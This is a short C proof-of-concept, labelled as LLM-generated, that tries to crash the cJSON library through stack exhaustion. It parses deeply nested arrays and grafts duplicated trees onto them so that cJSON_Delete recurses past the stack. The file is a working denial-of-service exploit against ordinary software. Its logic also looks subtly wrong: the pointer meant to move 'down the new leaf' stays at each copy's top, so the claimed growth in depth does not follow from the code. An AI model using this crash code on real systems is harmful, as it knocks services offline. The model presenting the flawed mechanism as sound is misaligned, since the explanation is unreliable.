/*
 * LLM-Generated PoC: cJSON Deep-Tree Stack Exhaustion
 * Target: cJSON_Duplicate / cJSON_Delete recursive stack overflow
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cJSON.h"

int main(void) {
    size_t depth = 990; // Just under CJSON_NESTING_LIMIT (1000)
    char *json = malloc(depth * 2 + 1);
    if (!json) return 1;

    for (size_t i = 0; i < depth; i++) {
        json[i] = '[';
        json[depth * 2 - 1 - i] = ']';
    }
    json[depth * 2] = '\0';

    printf("[+] Parsing payload at depth %zu...\n", depth);
    cJSON *root = cJSON_Parse(json);
    free(json);

    if (!root) {
        printf("[-] Parse failed.\n");
        return 1;
    }

    printf("[+] Parse succeeded. Grafting duplicate structures to amplify depth...\n");

    // Find the innermost node
    cJSON *curr = root;
    while (curr->child) {
        curr = curr->child;
    }

    // Repeatedly duplicate the tree onto itself to multiply depth beyond stack capacity
    for (int i = 0; i < 15; i++) {
        cJSON *dup = cJSON_Duplicate(root, 1);
        if (!dup) break;
        cJSON_AddItemToArray(curr, dup);
        curr = dup; // Extend pointer down the new leaf
    }

    printf("[+] Triggering recursive delete on deep structure...\n");
    // Triggers recursive stack overflow inside cJSON_Delete / cJSON_Duplicate
    cJSON_Delete(root);

    printf("[+] Clean execution (No crash).\n");
    return 0;
}